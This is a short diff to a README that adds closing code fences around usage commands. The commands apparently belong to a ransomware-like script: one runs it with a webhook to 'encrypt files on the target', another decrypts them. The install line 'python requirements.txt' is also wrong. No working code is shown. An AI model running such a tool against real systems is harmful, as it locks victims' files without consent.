@@ -26,10 +26,13 @@ Ensure you have Python installed. You can run the script with the following comm
 
 ```bash
 python requirements.txt
+```
 
 ```bash
 python main.py -w <your_webhook> [this will encrypt files on the target]
+```
 
 ```bash
 # decryption
 python main.py -d
+```
